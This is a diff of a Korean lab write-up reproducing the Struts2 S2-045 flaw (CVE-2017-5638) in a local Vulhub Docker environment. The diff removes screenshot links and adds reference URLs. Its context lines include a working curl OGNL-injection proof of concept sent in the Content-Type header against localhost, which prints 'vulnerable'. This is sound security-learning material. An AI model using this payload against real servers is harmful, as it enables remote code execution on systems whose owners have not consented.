@@ -16,8 +16,6 @@ cd vulhub/struts2/s2-045
 docker compose up -d
 컨테이너가 정상적으로 구동되었고, localhost:8080로 접근할 수 있었다.
 
-![컨테이너 띄운 화면](compose.png)
-
 3.2. 환경 구축 결과
 컨테이너가 정상적으로 올라가면서 Struts2 쇼케이스 페이지가 동작하는 것을 확인했다.
 
@@ -27,8 +25,6 @@ curl 명령어를 이용해 Content-Type 헤더에 OGNL 표현식을 삽입해 �
 
 curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action
 
-![PoC 성공 화면](curl.png)
-
 4.2. 결과 확인
 응답 본문에 vulnerable이라는 문자열이 출력되면서, 서버에서 OGNL 표현식이 실제로 실행된 것을 확인했다. 이를 통해 취약점이 존재함을 직접 검증할 수 있었다.
 
@@ -36,8 +32,9 @@ curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext
 이번 실습을 통해 도커로 취약한 환경을 빠르게 구성하고, 실제 취약점이 어떻게 악용될 수 있는지를 직접 체험할 수 있었다. Struts2처럼 널리 사용되는 프레임워크에서도 입력값 검증이 제대로 안 되면 큰 문제가 발생할 수 있다는 점을 실감했다. 실습을 진행하면서 PoC 과정이 생각보다 간단해서 보안 관리의 중요성을 다시 느꼈다.
 
 ## 6. 참고 자료
-Vulhub Struts2 S2-045 환경
-CVE-2017-5638 상세정보 - NVD
+- Vulhub Struts2 S2-045 환경 (https://vulhub.org/#/environments/struts2/s2-045/)
+- CVE-2017-5638 상세정보 - NVD (https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
+
 
 ## 7. GitHub 레포 링크
 https://github.com/soonnae/vulhub/tree/master/struts2/s2-045
